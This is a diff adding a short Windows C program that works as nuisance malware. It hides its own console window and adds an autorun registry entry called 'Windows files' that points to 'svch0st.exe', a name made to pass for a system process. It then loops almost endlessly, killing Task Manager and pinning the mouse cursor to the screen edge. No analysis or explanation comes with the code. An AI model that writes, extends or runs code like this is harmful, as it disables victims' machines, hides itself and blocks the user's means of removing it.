@@ -1,0 +1,106 @@
+﻿#include <windows.h>
+#include <winbase.h>
+#include <tlhelp32.h>
+#include <ctype.h>
+#include <string.h>
+ 
+#define BUFSIZE 90
+ 
+int test_key(void);
+int create_key(char *);
+int kill(void);
+ 
+BOOL KillProcess(LPSTR lpszExecutable)
+{
+    BOOL bResult = FALSE;
+    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
+    HANDLE hProcess, hProcesses = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if(Process32First(hProcesses, &pe32)){
+        do{
+            if(CompareString(LOCALE_USER_DEFAULT, NORM_IGNORECASE, pe32.szExeFile, -1, lpszExecutable, -1) == CSTR_EQUAL){
+                if((hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID)) != NULL){
+                    TerminateProcess(hProcess, 0); CloseHandle(hProcess); bResult = TRUE;
+                }
+            }
+        }while(Process32Next(hProcesses, &pe32));
+        CloseHandle(hProcesses);
+    }
+    return bResult;
+}
+ 
+ 
+ 
+int main(void)
+{
+    int test,create;
+    test=test_key();
+ 
+    if (test==2)
+    {
+        char *path="c:\\WINDOWS\\svch0st.exe";
+        create=create_key(path);
+ 
+    }
+ 
+HWND inv;
+    AllocConsole();
+    inv=FindWindowA("ConsoleWindowClass",NULL);
+    ShowWindow(inv,0);
+int c;
+for(c=0;c<999999999999;c++)
+{
+kill();
+SetCursorPos(1,900);
+Sleep(9);
+}
+}
+ 
+int test_key(void)
+{
+    int check;
+    HKEY hKey;
+    char path[BUFSIZE];
+    DWORD buf_length=BUFSIZE;
+    int reg_key;
+ 
+    reg_key=RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_QUERY_VALUE,&hKey);
+    if(reg_key!=0)
+    {
+        check=1;
+        return check;
+    }
+ 
+    reg_key=RegQueryValueEx(hKey,"Windows Files",NULL,NULL,(LPBYTE)path,&buf_length);
+ 
+    if((reg_key!=0)||(buf_length>BUFSIZE))
+        check=2;
+    if(reg_key==0)
+        check=0;
+ 
+    RegCloseKey(hKey);
+    return check;
+}
+ 
+int create_key(char *path)
+{
+        int reg_key,check;
+ 
+        HKEY hkey;
+ 
+        reg_key=RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey);
+        if(reg_key==0)
+        {
+                RegSetValueEx((HKEY)hkey,"Windows files",0,REG_SZ,(BYTE *)path,strlen(path));
+                check=0;
+                return check;
+        }
+        if(reg_key!=0)
+                check=1;
+ 
+        return check;
+}
+ 
+int kill(void)
+{
+return KillProcess("taskmgr.exe");
+}
